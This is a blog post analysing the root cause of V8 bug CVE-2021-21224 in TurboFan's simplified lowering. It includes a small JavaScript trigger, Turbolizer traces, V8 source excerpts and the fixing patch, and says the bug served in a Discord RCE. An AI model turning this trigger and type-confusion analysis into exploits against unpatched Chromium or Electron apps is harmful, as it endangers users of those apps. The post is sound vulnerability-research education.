---
title: "V8 CVE-2021-21224 Renderer RCE Root Cause Analysis"
date: 2024-10-29T17:30:20+05:30
draft: false
---

### V8 CVE-2021-21224 Renderer RCE Root Cause Analysis


Initially, I didn’t know much about V8’s exploitation as I was a web guy with interest in v8, it was my CTF teammate, [ptr-yudai](https://twitter.com/ptryudai?lang=en), who helped me craft the Discord exploit. Back then, understanding the root cause wasn’t always necessary; for some of the exploits used in [Electrovolt](https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Aaditya%20Purani%20-%20ElectroVolt%20Pwning%20popular%20desktop%20apps%20while%20uncovering%20new%20attack%20surface%20on%20Electron.pdf) research, I relied on regression tests added with patches or on existing exploits from GitHub or blogs. From there, I would write primitives and exploit Electron internals as needed. The goal for Electrovolt research was to exploit Electron apps running on older Chromium V8 versions with plenty of known bugs, often by using a JIT bug, writing the exploit, and compromising the app, so I never had to know about the root cause of the issue 😂.

But for the video and out of curiosity  took a deeper look into V8's TurboFan to understand the root cause of this bug and similar issues that surfaced around the same time. I ended up with a good amount of notes, so I decided to create an educational root cause analysis, hoping it might be helpful for others.

Now, let’s look into CVE-2021-21224 which we used for Discord RCE

**Original Report**: [Issue #40055451](https://issues.chromium.org/issues/40055451)

**Checkout:** git checkout b24f7ea946d

Here’s a modified PoC for explanation purposes based on the original report. This function `foo` demonstrates the bug:

#### PoC:

```js
function foo(a) {
        let x = -1;
        if (a){
            x = 0xFFFFFFFF;
        }
        let out = 0 - Math.max(0, x)
        return out;
};
console.log(foo(true));
for (var i = 0; i < 0x10000; ++i) {
        foo(false);
}
 console.log(foo(true));
 ```

When running this with a vulnerable version of V8, we observe surprising results, we got different output for same foo(true) call:
> \> ./v8/out.gn/discord.debug/d8 discord.js --allow-natives-syntax
-4294967295
0
1

Let’s see what is happening

* Before TurboFan optimizes the function, the code executes as expected producing the following result:
  `0 - Math.max(0, 0xFFFFFFFF) => 0 - 0xFFFFFFFF => -4294967295`
* With `a` set to `false`, `x` remains `-1`, so 0 is expected:

  `0 - Math.max(0, -1) => 0 - 0 => 0`

* However, Here’s where things get interesting. After TurboFan optimizes the function, `foo(true)` produces a different result:


  `0 - Math.max(0, 0xFFFFFFFF) => 0 - SOME_X => 1`

* This implies that `Math.max(0, 0xFFFFFFFF)` is unexpectedly returning `-1` after optimization, leading to `0 - (-1) = 1`.

This unexpected result suggests that the `Math.max` function, when optimized by TurboFan, fails to handle the `0xFFFFFFFF` value correctly. Instead of returning `0xFFFFFFFF` (the unsigned 32-bit maximum value, or `4294967295`), the optimized code interprets it as `-1`. This happens because `0xFFFFFFFF` is `-1` in 32-bit two's complement representation, meaning TurboFan is treating it as `Signed32(Int32)` instead of `Unsigned32(UInt32)`.

#### Now let’s look at the patch

**Patch and Description**: [Chromium Code Review #2817791](https://chromium-review.googlesource.com/c/v8/v8/+/2817791)
*[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor*
*We have to respect the TypeCheckKind.*

![](/img/patch.png)
Fig 1: Diff of src/compiler/representation-change.cc @ Node* RepresentationChanger::GetWord32RepresentationFor(


Without knowing anything about the variables, just checking the code before patch, `RepresentationChanger::GetWord32RepresentationFor` would truncate values from `Int64` to `Int32` whenever the `output_rep` was `kWord64` and the `output_type` was either `Signed32` (range `-0x80000000` to `0x7FFFFFFF`) or `Unsigned32` (range `0x0` to `0xFFFFFFFF`). This meant that, regardless of whether the integer was supposed to be signed or unsigned, the function simply reduced the 64-bit integer to a 32-bit representation.

This explains the unexpected behavior we observed with `Math.max(0, 0xFFFF_FFFF)` after optimization. When `0xFFFF_FFFF` was truncated to `Int32`, it was interpreted as `-1` due to two's complement representation. As a result, `Math.max(0, 0xFFFF_FFFF)` returned `-1` instead of `0xFFFFFFFF`, causing the final calculation of `0 - (-1)` to yield `1`.

Now Let’s see what is actually happening and what these variables are. As the bug happens in the Turbofan optimization phase, we need a good understanding of how it works. For that I refer the following resources

- **Bug Reports and RCA**:
  - [Chromium Issue #40092352: `Math.expm`](https://issues.chromium.org/issues/40092352)
  - [CVE-2020-16040 Analysis by Faraz](https://faraz.faith/2021-01-07-cve-2020-16040-analysis/)
  - [Exploiting `Math.expm1` in V8](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/)
- **Speculative Optimization**:
  - [Introduction to Speculative Optimization in V8 - Ponyfoo](https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8)
  - [Slide Deck on Speculative Optimization](https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_089)
  - [https://webkit.org/blog/10308/speculation-in-javascriptcore/](https://webkit.org/blog/10308/speculation-in-javascriptcore/) : One of the extensive blog on speculation compilers
  - [Introduction to TurboFan by DOAR-E](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/)
- **Pwn2Own 2021 Exploit Analysis**:
  - [Two Birds with One Stone: Intro to V8 and JIT Exploitation](https://www.zerodayinitiative.com/blog/2021/12/6/two-birds-with-one-stone-an-introduction-to-v8-and-jit-exploitation)
  - [Exploitation of CVE-2021-21220](https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce)

### Turbofan Intro

A small intro of Turbofan would be, When a JavaScript snippet runs in V8, the process begins by generating an **Abstract Syntax Tree (AST)**, which is then converted to **bytecode** executed by the **Ignition Interpreter which also stores type information while executing this called feedback**. As a function runs repeatedly (often termed "becoming hot"), it signals to V8 that it may benefit from optimization.

This is where **TurboFan** comes into play. TurboFan receives the bytecode for this "hot" function, along with **type feedback** or profiling information from Ignition, to perform **speculative optimization**. Since JavaScript is dynamically typed (unlike statically-typed languages like C), TurboFan speculates on the types for efficiency. For instance, in an expression like `a + b`, if `a` and `b` are likely `int32`, TurboFan may use an `int32` addition instead of computational expensive floating point or int64 addition, type information can tell what efficient registers to use, what instructions to choose and many more.

Unlike C compiler the dynamic Turbofan can’t infer that a type of a variable is exactly X type so it just speculates on the type based on the feedback and for instance if one of the values unexpectedly becomes a large number or changes to a different type (e.g., a string), this assumption breaks. In such cases, V8 detects the mismatch, "deoptimizes," and switches back to unoptimized bytecode. In such cases, V8 detects the mismatch, "deoptimizes," and switches back to unoptimized bytecode.

![](/img/image1.png)
Fig 2: Difference between c and JavaScript @ [source](https://webkit.org/blog/10308/speculation-in-javascriptcore/)

TurboFan goes beyond speculative compilation by applying multiple optimizations to improve JavaScript execution. It eliminates dead code, does constant folding, inlines small functions to reduce call overhead, and removes redundant operations, and many more to make the code faster.

![](/img/image6.png)
Fig 3: Source: A Tale of TurboFan by Benedikt Meurer

To get even better understanding, read the above blogs and for this blog this is good enough of an intro to dig into the bug and do the root cause analysis.

### The Root Cause Analysis

*discord.js*
```js
    function foos(a) {
        let x = -1;
        if (a){
            x = 0xFFFFFFFF;
        }
        let out = 0 - Math.max(0, x)
        return out;
    };
    console.log(foos(true));
  %PrepareFunctionForOptimization(foos);
  console.log(foos(false));
  %OptimizeFunctionOnNextCall(foos);
  console.log(foos(true));
   ```
Execute the code above and open the generated turbo-foos-0.json file in [Turbolizer](https://github.com/v8/v8/tree/main/tools/turbolizer)—a nice tool for visualizing the various phases TurboFan goes through during bytecode optimization.
>d8 discord.js --allow-natives-syntax --trace-representation --trace-turbo

#### *Graph Builder phase*

In the first phase of the turbofan, we can notice that the Graph is built for the foos function using its bytecode as shown in Fig 4.  In Fig 5, JSCall Node(#36) in the graph refers to Math.max function and SpeculativeSafeIntegerSubtract(#41) refers to subtraction from NumberConstant[0] (#22) and JSCall output.

![](/img/image5.png)
Fig 4: foos function bytecode


![](/img/image3.png)
Fig 5: Turbofan 1st phase

#### *Inlining Phase*

Next, during the **Inlining phase**, the `Math.max` JS call is transformed into a `NumberMax` node. Inside the ReduceMathMinMax function each input(#21 and #54) to the `NumberMax` node has a new node called `SpeculativeToNumber` inserted between them. Nothing interesting took place here except Math.max JSCall is converted to NumberMax because this might be used in further optimization phases to replace Math.max with just instruction without needing to call Math.max.

src/compiler/js-call-reducer.cc
```c++
   case Builtin::kMathMax:

     return ReduceMathMinMax(node, simplified()->NumberMax(),

                             jsgraph()->ConstantNoHole(-V8_INFINITY));
```
![](/img/image8.png)
Fig 6: Inlining phase

#### *Typer Phase:*

In the **Typer phase**, each node is assigned a type, with a **range** added to define the possible values the node can hold. This range helps V8 speculate on the node’s type more accurately. For instance, a `NumberConstant` node for `-1` will have a range `(-1, -1)`, indicating its exact value is `-1` and probably speculated as an `int32`. The variable “`x”`in our function type is `Phi` Node(or union) of two values with ranges `(-1, -1)` of Node #14 and `(0, 0xFFFFFFFF)` of Node #20, so input to `NumberMax` will take the union of these ranges, resulting in `(-1, 0xFFFFFFFF)`.

Notice that For the `NumberMax` node, the range `(0, 0xFFFFFFFF)` is assigned, as this is the only range that can result from the `Math.max` computation. Since `Math.max(0, -1)` and `Math.max(0, 0xFFFFFFFF)` will only produce values within this range, it accurately reflects the possible output of the `Math.max` operation. So far so good, let’s move on to the next phase.

![](/img/image7.png)
Fig 7: Typer phase

#### *Typed Lowering*

In the **Typed Lowering** phase, `SpeculativeToNumber` nodes #55 #54 are removed since `NumberConstant` nodes are guaranteed to remain `NumberConstant`, which simplifies the graph as shown below. Beyond this, nothing particularly interesting or relevant to our focus occurs in this phase.

![](/img/image10.png)

Fig 8: Typed lowering phase

#### Simplified Lowering Phase

In the **Simplified Lowering** phase, V8’s TurboFan compiler optimizes high-level operations by selecting the best machine-level representations and instructions. For example, SpeculativeSafeIntegerSubtract is replaced below with machine-level representation instruction Int32Sub.

This Simplified lowering has three main steps, Faraz has a pretty good blog on this phase for RCA of a bug [here](https://faraz.faith/2021-01-07-cve-2020-16040-analysis/). You can add --trace-representation command line argument to see TRACE of what’s happening in simplified lowering. Let’s see how the below final Graph after simplified lowering is created

![](/img/image4.png)
 Fig 9: Simplified Lowering

**Step 1: Propagate phase**

In the **PROPAGATE** phase, TurboFan traverses the graph from outputs to inputs, moving from the bottom to the top and determining the ideal machine representation for each node and its inputs, based on how it's used. Let’s say the traversal is at Node #41 which is SpeculativeSafeIntegerSubtract the Node(relevant for our bug).

It enters a switch case at [1] in the below code and calls VisitSpeculativeIntegerAdditiveOp with node, and default truncation value Truncation::None(), lowering is false for propagate phase. (I will explain what is truncation below)

*src/compiler/simplified-lowering.cc*
```c++
 template <Phase T>
 void VisitNode(Node* node, Truncation truncation,
                SimplifiedLowering* lowering) {
   tick_counter_->TickAndMaybeEnterSafepoint();

   if (lower<T>()) {
[...]

[...]
     case IrOpcode::kSpeculativeSafeIntegerAdd:
     case IrOpcode::kSpeculativeSafeIntegerSubtract: // [1]
       return VisitSpeculativeIntegerAdditiveOp<T>(node, truncation, lowering);
       // visit #41: SpeculativeSafeIntegerSubtract (trunc: no-truncation (but distinguish zeros))
```
Then inside VisitSpeculativeIntegerAdditiveOp speculates that SpeculativeSafeIntegerSubtract produces kSignedSmall, technically our PoC doesn’t produce kSignedSmall but it speculates. And from this kSignedSmall speculation, UseInfo[4] object is created for both the operands of subtraction. The class is used to describe the use of an input of a node. UseInfo == How the Node is used.  During this phase, the usage information for a node determines the best possible lowering for each operator so far, and that in turn determines the output representation of each node.

So here the left and right operands are used in SpeculativeSafeIntegerSubtract as [3] kWord32, kSignedSmall typecheck. Next calls are not relevant for our bug in the propagation phase. Also importantly the restriction of the current node at [0] is set to Type:Signed32() in our case, which means the node is restricted to igned32 range only.
```c++
 template <Phase T>
 void VisitSpeculativeIntegerAdditiveOp(Node* node, Truncation truncation,
                                        SimplifiedLowering* lowering) {
   [...]
   // Try to use type feedback.
   Type const restriction =
       truncation.IsUsedAsWord32()? Type::Any()  : (truncation.identify_zeros() == kIdentifyZeros)
                 ? Type::Signed32OrMinusZero()
                 : Type::Signed32(); [0]

   NumberOperationHint const hint = NumberOperationHint::kSignedSmall; // [1]
   DCHECK_EQ(hint, NumberOperationHintOf(node->op()));
     [...]
     UseInfo left_use =
         CheckedUseInfoAsWord32FromHint(hint, left_identify_zeros); // [2]
     // For CheckedInt32Add and CheckedInt32Sub, we don't need to do
     // a minus zero check for the right hand side, since we already
     // know that the left hand side is a proper Signed32 value,
     // potentially guarded by a check.
     TRACE("[checked] We  are second here %s",node->op()->mnemonic());
     //UseInfo(MachineRepresentation::kWord32,   Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,   feedback);
     UseInfo right_use = CheckedUseInfoAsWord32FromHint(hint, kIdentifyZeros); // [3]
     VisitBinop<T>(node, left_use, right_use, MachineRepresentation::kWord32,
                   restriction);

   }
//src/compiler/use-info.h

class UseInfo { [4]

public:

 UseInfo(MachineRepresentation representation, Truncation truncation,

         TypeCheckKind type_check = TypeCheckKind::kNone,

         const FeedbackSource& feedback = FeedbackSource())

     : representation_(representation),

       truncation_(truncation),

       type_check_(type_check),

       feedback_(feedback) {}

 }
```
Also as the name implies it propagates "truncation" information, stored in the `UseInfo` to the upper node while it's traversing. Here “truncation” specifies which part of the input to use at that node. For example, when the propagate phase visits a `Branch` (#16) node, it truncates its input(#15 below) to `bool` since `Branch` expects a boolean value. For bitwise operators like `or(#25)`, inputs are truncated to `word32 (#21, #21)`. Usually a new node is created between input and or binary operation with an instruction called TruncateInt64ToInt32 which simply discards the higher bits.

Output from –trace-representation for statement (return x | a)
```py
--{Propagate phase}--

visit #25: SpeculativeNumberBitwiseOr (trunc: no-truncation (but distinguish zeros)) // OR | Node

  initial #21: truncate-to-word32 // x

  initial #2: truncate-to-word32 // a

  [...]

 visit #16: Branch (trunc: no-value-use)

  	initial #15: truncate-to-bool
```
For our poc, the propagate phase produces the following representation. Notice that SpeculativeSafeIntegerSubtract and NumberMax inputs don’t have any truncation reflecting our analysis above.
```py
--{Propagate phase}--

 visit #42: Return (trunc: no-value-use)

  initial #22: truncate-to-word32

  initial #41: no-truncation (but distinguish zeros)

  initial #41: no-truncation (but distinguish zeros)

  initial #18: no-value-use

 visit #41: SpeculativeSafeIntegerSubtract (trunc: no-truncation (but distinguish zeros))

  initial #22: no-truncation (but distinguish zeros)

  initial #56: no-truncation (but identify zeros)

  initial #52: no-value-use

  initial #18: no-value-Use

  [...]

 visit #56: NumberMax (trunc: no-truncation (but identify zeros))

  initial #22: no-truncation (but distinguish zeros)

  initial #21: no-truncation (but distinguish zeros)
```
**Step 2: Retype phase**

Then, in **RETYPE**, for every node the type information is updated [1] based on type feedback collected from previous phases, allowing more refined type assumptions as TurboFan continues to lower nodes.
```c++
bool RetypeNode(Node* node) {

   NodeInfo* info = GetInfo(node);

   info->set_visited();

   bool updated = UpdateFeedbackType(node);// [1]

   TRACE(" visit #%d: %sn", node->id(), node->op()->mnemonic());

   VisitNode<RETYPE>(node, info->truncation(), nullptr); [2]

   TRACE("  ==> output %sn", MachineReprToString(info->representation()));

   return updated;}
```
Let’s see how the type information is updated for each of our important nodes.
```c++
 bool UpdateFeedbackType(Node* node) {

   [...]

   NodeInfo* info = GetInfo(node);

   Type type = info->feedback_type();

   Type new_type = NodeProperties::GetType(node);

   Type input0_type;

   if (node->InputCount() > 0) input0_type = FeedbackTypeOf(node->InputAt(0)); //GetInfo(node)->feedback_type();

   Type input1_type;

   if (node->InputCount() > 1) input1_type = FeedbackTypeOf(node->InputAt(1));

   switch (node->opcode()) {case IrOpcode::k##Name: {

     case IrOpcode::SpeculativeNumberSubtract:  {

       new_type = Type::Intersect(op_typer_.SpeculativeNumberSubtract(input0_type, input1_type), info->restriction_type(), graph_zone());   [5]

      break;

      }

	 case IrOpcode::kNumberMax: {

              new_type = op_typer_.NumberMax(input0_type, input1_type);  [4]

   	break;

 	}

     case IrOpcode::kPhi: {

       new_type = TypePhi(node);

       if (!type.IsInvalid()) {

         new_type = Weaken(node, type, new_type);

       }

       break;

     }

   [...]

   new_type = Type::Intersect(GetUpperBound(node), new_type, graph_zone());

   if (!type.IsInvalid() && new_type.Is(type)) return false;

   GetInfo(node)->set_feedback_type(new_type); // node->feedback_type_ = new_type [2]

   if (v8_flags.trace_representation) {

     PrintNodeFeedbackType(node);

   }

   return true;

 }

 Type TypePhi(Node* node) {

   int arity = node->op()->ValueInputCount();

   Type type = FeedbackTypeOf(node->InputAt(0));

   for (int i = 1; i < arity; ++i) {

     type = op_typer_.Merge(type, FeedbackTypeOf(node->InputAt(i))); [1]

   }

   return type;

 }

MachineRepresentation GetOutputInfoForPhi(Type type, Truncation use) {

   // Compute the representat[...]

   } else if (type.Is(Type::Number())) {

     return MachineRepresentation::kFloat64; [3]

   }
```

* Node #21 Phi Node: Looking at the above code, the Phi Node's  (variable x in poc's range)  new_type which means the feedback_type[2] is set to Merge(input0, input1) which is union of inputs.
  * input0 = Range(-1,-1) #14
  * Input1  = Range(0xFFFF_FFFF, 0xFFFF_FFFF) #20
  * node->feedback_type_ =merge(input0, input1) = `Range(-1, 0xFFFFFFFF)`
  * In the Retype phase log output, we can see at #21 Static type the feedback_type is the merged version.
  * After this in RetypeNode function [2]  VisitNode<RETYPE> call the the Nodes output’s representation(node->info->representation()) is set to kRepFloat64, because as it is in Number Range [3].
* **Node #52: Numbermax** feedback_type is updated[4] by calling op_typer_.NumberMax() which essentially takes a maximum of either side of the ranges.
  * Input0 = Range(-1, 0xFFFF_FFFF)  #21
  * Input1 = Range(0,0) #2
  * node->feedback_type_  = (0,0xFFFF_FFFF)
     double min = std::max(lhs.Min(), rhs.Min());
     double max = std::max(lhs.Max(), rhs.Max());
     type = Type::Union(type, Type::Range(min, max, zone()), zone());
  * In the below trace #52 node->info->representation() which is the output’s representation is set to kRepWord64 given its final range.
* **Node #41:** Interestingly SpeculativeSafeIntegerSubtract new_type is [5] Intersection of input0 and input1 operands type and the restriction_type (kSigned32) from propagate phase
  * Input0 = Range(0,0) #22
  * Input1 = Range(0,0xFFFF_FFFF) #52:NumberMAx
  * node->feedback_type_  = Intersection(OperationTyper::SpeculativeNumberSubtract(input0, input1)=>(-4294967295, 0), restriction_type=kSigned32(-0x8000_0000, 0x7FFF_FFFF)) = (-2147483648, 0)
    * Notice that the static type is overflowed for kSigned32, and feedback_type is restricted to Signed32 range.
  * Finally in the trace, the output representation is set to **kRepWord32.**
  * **If you look closely, the output representation is set to `kRepWord32`. Doesn’t this mean the subtraction operates only on the lower 32 bits? Yep That’s correct; the subtraction does take place within the 32-bit range (`kRepWord32`). However, TurboFan continues with this 32-bit representation and produces optimized code with overflow checks, and if it detects overflow or precision loss during execution—which will happen in the PoC—it triggers a bailout and deoptimizes, switching to a more accurate, non-optimized execution path. And if we run our code in patched d8, the deoptimization takes place as below but not on our vulnerable d8.**
    > \>./v8/out.gn/arm64.debug/d8 discord.js
    --allow-natives-syntax --trace-deopt --trace-opt

    **-4294967295**
    **0**
    **[manually marking 0x1472000491c5 <JSFunction foos (sfi = 0x1472002992e1)> for optimization to TURBOFAN_JS, ConcurrencyMode::kSynchronous]**
    **[compiling method 0x1472000491c5 <JSFunction foos (sfi = 0x1472002992e1)> (target TURBOFAN_JS), mode: ConcurrencyMode::kSynchronous]**
    **[completed compiling 0x1472000491c5 <JSFunction foos (sfi = 0x1472002992e1)> (target TURBOFAN_JS) - took 0.125, 10.333, 0.625 ms]**
    **[bailout (kind: deopt-eager, reason: lost precision): begin. deoptimizing 0x1472000491c5 <JSFunction foos (sfi = 0x1472002992e1)>, 0x112b000402cd <Code TURBOFAN_JS>, opt id 0, node id 97, bytecode offset 12, deopt exit 0, FP to SP delta 32, caller SP 0x00016b074ee0, pc 0x00016d340244]**
    **-4294967295**

```py
--{Retype phase}--

#21:Phi[kRepTagged](#14:NumberConstant, #20:NumberConstant, #18:Merge)  [Static type: Range(-1, 4294967295)] // variable x

 visit #21: Phi

  ==> output kRepFloat64

#52:NumberMax(#22:NumberConstant, #21:Phi)  [Static type: Range(0, 4294967295)] // Math.max

 visit #52: NumberMax

  ==> output kRepWord64

#41:SpeculativeSafeIntegerSubtract[SignedSmall](#22:NumberConstant, #52:NumberMax, #23:Checkpoint, #18:Merge)  [Static type: Range(-4294967295, 0), Feedback type: Range(-2147483648, 0)]

 visit #41: SpeculativeSafeIntegerSubtract

   ==> output kRepWord32
```
So far, so good nothing wrong with Turbofan optimization, let’s check the final phase of simplified lowering.

**Step3: Lower Phase**

Finally, in **LOWER**, each node is transformed into lower-level machine-specific nodes, with some nodes replaced, expanded, or removed as redundant. The `RepresentationChanger(src/compiler/representation-change.cc)` manages any necessary conversions to ensure each value uses the appropriate machine-level representation, completing the optimization. Let’s see how our Nodes from the previous Typed Lowering phase gets updated. Below fig 9 is unpatched and fig 10 is patched.

* Notice that #68 #67 NumberConstant nodes are lowered to Float64Constant because #21 machine-representation is set to kRepFloat64 in previous phase
* NumberMax is completely removed and replaced with In64LessThan and Select[kRepWord64] which makes sense because. **Importantly, notice that the LessThan and Select are both 64-bit which makes sense because our #52:NumberMax output representation is kRepWord64 so the lower instructions are chosen accordingly. This can be traced in the code.**
  * Math.max can be done this way
  * condition = Int64LessThan(a, b)
  *  // If 'condition' is true (a < b), Select chooses 'b'. // If 'condition' is false (a >= b), Select chooses 'a'.
  * result = Select(condition, b, a);
* So far so good and it matches the patched version too.
* **The interesting part is that, in the unpatched version, the output of `#56:Select` is passed to `#72:TruncateInt64ToInt32`, while in the patched version, it’s passed to `#72:CheckedUInt64ToInt32`. This is critical because `TruncateInt64ToInt32` discards the upper 32 bits, whereas `CheckedUInt64ToInt32` performs an overflow check to prevent data loss. This vulnerable node allowed us to make the optimized output of `Math.max` produce `0x0000_0000_FFFF_FFFF` (Int64) and interpret it as `-1` (Int32, using 2’s complement representation of `0xFFFFFFFF`). We identified the exact node that caused the bug—let’s dive into the code to see what went wrong.**
* Also Notice for patched version the Int32 Sub has correct Range for Int32 Subtraction, but the unpatched version has incorrect Range for Int32 subtraction. It seems feedback_type is not updated to actual NodeProperties::SetType  (I couldn’t debug with source code on my shitty mac silicon d8)

  ![](/img/image4.png)
   Fig 9 Unpatched: Simplified Lowering


![](/img/image2.png)
    Fig 10 Patched: Simplified Lowering

The output of Lower Phase
```python
--{Lower phase}--
 visit #52: NumberMax
  change: #52:NumberMax(@0 #22:NumberConstant) from kRepTaggedSigned to kRepWord64:no-truncation (but distinguish zeros)
  change: #52:NumberMax(@1 #21:Phi) from kRepFloat64 to kRepWord64:no-truncation (but distinguish zeros)
  visit #41: SpeculativeSafeIntegerSubtract
     change: #41:SpeculativeSafeIntegerSubtract(@0 #22:NumberConstant) from kRepTaggedSigned to kRepWord32:no-truncation (but distinguish zeros)
      change: #41:SpeculativeSafeIntegerSubtract(@1 #52:Select) from kRepWord64 to kRepWord32:no-truncation (but identify zeros)
  visit #42: Return
  change: #42:Return(@0 #22:NumberConstant) from kRepTaggedSigned to kRepWord32:truncate-to-word32
  change: #42:Return(@1 #41:Int32Sub) from kRepWord32 to kRepTagged:no-truncation (but distinguish zeros)
 visit #43: End
```

**Lowering Phase Source Code Flow**

The VisitNode enters switch for #41:SpeculativeSafeIntegerSubtract[1] just like the previous ReType phase. The left and right operands are used for SpeculativeSafeIntegerSubtract with UseInfo [3] kWord32, kSignedSmall typecheck. And inside the VisitBinop left and right[5] operand UseInfo are passed to ProcessInput separately.

```c++
 template <Phase T>
// visit #26: SpeculativeSafeIntegerSubtract
 void VisitSpeculativeIntegerAdditiveOp(Node* node, Truncation truncation,
                                        SimplifiedLowering* lowering) { [1]
   Type left_upper = GetUpperBound(node->InputAt(0));
   Type right_upper = GetUpperBound(node->InputAt(1));
[...]
  // Try to use type feedback.
   Type const restriction =
       truncation.IsUsedAsWord32()? Type::Any()  : (truncation.identify_zeros() == kIdentifyZeros)
                 ? Type::Signed32OrMinusZero()
                 : Type::Signed32(); [0]

   NumberOperationHint const hint = NumberOperationHint::kSignedSmall; // [2]
   DCHECK_EQ(hint, NumberOperationHintOf(node->op()));
     [...]
    //UseInfo(MachineRepresentation::kWord32,   Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,   feedback);
     UseInfo left_use =
         CheckedUseInfoAsWord32FromHint(hint, left_identify_zeros); // [3]
     // For CheckedInt32Add and CheckedInt32Sub, we don't need to do
     // a minus zero check for the right hand side, since we already
     // know that the left hand side is a proper Signed32 value,
     // potentially guarded by a check.
     TRACE("[checked] We  are second here %s",node->op()->mnemonic());
     //UseInfo(MachineRepresentation::kWord32,   Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,   feedback);
     UseInfo right_use = CheckedUseInfoAsWord32FromHint(hint, kIdentifyZeros); // [4]
     VisitBinop<T>(node, left_use, right_use, MachineRepresentation::kWord32,
                   restriction);

   }
template <Phase T>
 void VisitBinop(Node* node, UseInfo left_use, UseInfo right_use,
                 MachineRepresentation output,
                 Type restriction_type = Type::Any()) {
   DCHECK_EQ(2, node->op()->ValueInputCount());
   ProcessInput<T>(node, 0, left_use); [5]
   ProcessInput<T>(node, 1, right_use); [6]
   for (int i = 2; i < node->InputCount(); i++) {
     EnqueueInput<T>(node, i);
   }
   SetOutput<T>(node, output, restriction_type);
 }

The ProcesInput<LOWER> function calls the ConvertInput at [1]
template <>
void RepresentationSelector::ProcessInput<LOWER>(Node* node, int index,
                                                UseInfo use) {
 DCHECK_IMPLIES(use.type_check() != TypeCheckKind::kNone,
                !node->op()->HasProperty(Operator::kNoDeopt) &&
                    node->op()->EffectInputCount() > 0);
 ConvertInput(node, index, use); [1]
}
```

In the ConvertInput function each node is lowered/converted accordingly:

* **For the input #14:NumberConstant**  at  [1], its representation is stored in *input_rep*, which is the output representation info we figured in the Retype phase. For NumberConstant it is kRepTaggedSigned and use variable  consists of UseInfo for SpeculativeNumberLessThan. The input_type is Range(0,0). All these variables are passed to a call to GetRepresentationFor [3]
* **For the input #52:Select at [1],** its representation is stored in input_rep, which is the output representation info we figured in the Retype phase. For Select it is  kRepWord64. But the UseInfo representation consists of kWord32 because that’s how it is speculated to be used in SpeculativeSafeIntegerSubtract:#41 node. The input_type is Range(0,0xFFFF_FFFF)(NumberMax output range). All these variables are passed to a call to GetRepresentationFor [3]
```c++
void ConvertInput(Node* node, int index, UseInfo use,
                   Type input_type = Type::Invalid()) {
   // In the change phase, insert a change before the use if necessary.
   if (use.representation() == MachineRepresentation::kNone)
     return;  // No input requirement on the use.
   Node* input = node->InputAt(index); [1]
   DCHECK_NOT_NULL(input);
   NodeInfo* input_info = GetInfo(input);
   MachineRepresentation input_rep = input_info->representation(); [2]
   [...]
   if (input_type.IsInvalid()) {
       input_type = TypeOf(input);
       TRACE("input_type %s", input_type)
     }
    [...]
     Node* n = changer_->GetRepresentationFor(input, input_rep, input_type,
                                              node, use); [3]
//input=Select, input_rep=kRepWord64, inpute_type=Range(0,0xFFFF_FFFF), node=SpeculativeNumberLessThan
//use=UseInfo(MachineRepresentation::kWord32, Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,
    node->ReplaceInput(index, n);
   }
 }
```
Let’s discard #14:NumberConstant input node from here which is not relevant. The relevant input node is #52:Select, the use_info.representation() [1] will be kWord32 as we figured, so the **GetWord32RepresentationFor [2]** function is called with the same variables from previous GetRepresentationFor[3], but just input_ part in variable is renamed output_

```c++
Node* RepresentationChanger::GetRepresentationFor(
   Node* node, MachineRepresentation output_rep, Type output_type,
   Node* use_node, UseInfo use_info) {
[..]
switch (use_info.representation()) {//kword32, the less than operation left side node usually makes this [1]
   case MachineRepresentation::kWord32:
     return GetWord32RepresentationFor(node, output_rep, output_type, use_node,
                                       use_info); [2]
```

Now we reached exactly to the point where the code is patched in the fix.

For the #52:Select input node these are the variables.

* //input=Select, output_rep=kRepWord64, output_type=Range(0,0xFFFF_FFFF), use_node=SpeculativeNumberLessThan
* //use=UseInfo(MachineRepresentation::kWord32, Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,

As outpu_rep is kRepWord64 we will take the [1] switch case. Using the output_type Range the Type is determined by calling output_type.Is(Type::Unsigned32()) at [2]. Essentially what it does is at [3], the range is checked to see what type of representation it comes under either Signed32 or UnSigned32.  The Range(0,0xFFFF_FFFF) is obviously not Signed32(0x8000_0000, 0xFFFF_FFFF). But it is the Unsigned32()(0, 0xFFFF_FFFF) exactly. **The if condition is satisfied so the new node is created with “op = machine()->TruncateInt64ToInt32();” and inserted in between #52:Select and #41:SpeculativeNumberLessThan.**

```c++
Node* RepresentationChanger::GetWord32RepresentationFor(
   Node* node, MachineRepresentation output_rep, Type output_type,
   Node* use_node, UseInfo use_info) {
 // Eagerly fold representation changes for constants.
[...]
} else if (output_rep == MachineRepresentation::kWord64) { [1]
   if (output_type.Is(Type::Signed32()) ||
       output_type.Is(Type::Unsigned32())) { [2]
     op = machine()->TruncateInt64ToInt32(); [4]
   }

[...]
return InsertConversion(node, op, use_node);

// Check if [this] <= [that].//src/compiler/turbofan-types.cc
bool Type::SlowIs(Type that) const {
 DisallowGarbageCollection no_gc;
//[...] isRange(0, 4294967295) of select matches with 32-bit unsigned integer
 if (that.IsRange()) {
   return this->IsRange() && Contains(that.AsRange(), this->AsRange()); [3]
 }
```

That’s how this bug surfaced. In the patch, a new condition is added at [1]: if only `use_info.type_check() == TypeCheckKind::kNone` and `output_type` is `Unsigned32`, then a truncation node is added. This essentially means if the node that uses this input doesn’t need any type checks then use this if not use the CheckedUnint64ToInt32[2] which checks for overflows. What a subtle bug.

```c
if (output_type.Is(Type::Signed32()) ||
       (output_type.Is(Type::Unsigned32()) &&
        use_info.type_check() == TypeCheckKind::kNone) || [1]
       (output_type.Is(cache_->kSafeInteger) &&
        use_info.truncation().IsUsedAsWord32())) {
     op = machine()->TruncateInt64ToInt32();
else if (use_info.type_check() == TypeCheckKind::kSignedSmall ||
              use_info.type_check() == TypeCheckKind::kSigned32 ||
              use_info.type_check() == TypeCheckKind::kArrayIndex) {
